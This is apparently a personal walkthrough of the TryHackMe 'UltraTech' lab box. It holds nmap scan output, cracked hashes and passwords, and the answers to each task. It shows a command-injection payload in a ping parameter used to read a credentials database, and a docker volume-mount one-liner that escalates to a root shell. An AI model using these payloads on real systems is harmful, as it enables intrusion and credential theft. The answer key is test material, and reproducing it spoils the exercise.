TryHackMe.com

Box = UltraTech

export IP=10.10.125.242

# NMAP SCANS

```
# Nmap 7.60 scan initiated Mon Jan 11 07:59:22 2021 as: nmap -A -T4 -oN nmap/NmapScan -p- 10.10.125.242
Warning: 10.10.125.242 giving up on port because retransmission cap hit (6).
Nmap scan report for ip-10-10-125-242.eu-west-1.compute.internal (10.10.125.242)
Host is up (0.00046s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (EdDSA)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
MAC Address: 02:E3:C0:B6:C8:85 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/11%OT=21%CT=1%CU=31168%PV=Y%DS=1%DC=D%G=Y%M=02E3C0%T
OS:M=5FFC0A56%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%TS=A
OS:)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=RD%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2
OS:301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11
OS:)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W
OS:=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms ip-10-10-125-242.eu-west-1.compute.internal (10.10.125.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 11 08:20:38 2021 -- 1 IP address (1 host up) scanned in 1276.73 seconds

```
# USERNAMES AND HASHES AND PASSWORDS

```
- John McFamicom | r00t:f357a0c52799563c7c7b76c1e7543a32:n100906
- Francois LeMytho | P4c0
- Alvaro Squalo | Sq4l
- admin:0d0ea5111e3c1def594c1684e3b9be84:mrsheafy
```

# INTERESTING FINDS

```

- gobuster shows /auth and /Auth in port 8081.
- nmap shows apache web server at port 31331
- at port 8081, the application used is Node.js
- gobuster shows /javascript page that is forbidden to view.
- gobuster also shows /partners.html that is a login page
- /ping?cmd=`ls` in /auth shows DB name.
- /ping?cmd=`cat utech.db.sqlite` shows hash for r00t user.

```

# TASK 2: ENUMERATION

```
1. What software is using the port 8081?

- Node.js

2. Which non-standard port is used?

- 31331

3. Which software is using this port?

- Apache

4. What GNU/Linux distribution seems to be used?

- Ubuntu

5. The software using the port 8080 is a REST api, how many of its routes are used by the application?

- 2

```

# TASK 2: INITIAL FOOTHOLD

```

1. There is a database lying around, what is its filename?

- utech.db.sqlite

2. What is the first user's password hash?

- f357a0c52799563c7c7b76c1e7543a32

3. What is the password associated with this hash?

- n100906

```

# TASK 3: PRIVILEGE ESCALATION

Solution: (gtfobins: https://gtfobins.github.io/gtfobins/docker/)

*docker run -v /:/mnt --rm -it [IMAGE_NAME] chroot /mnt sh*
```
1. First 9 characters of root user's SSH KEY?

- MIIEogIBA  
```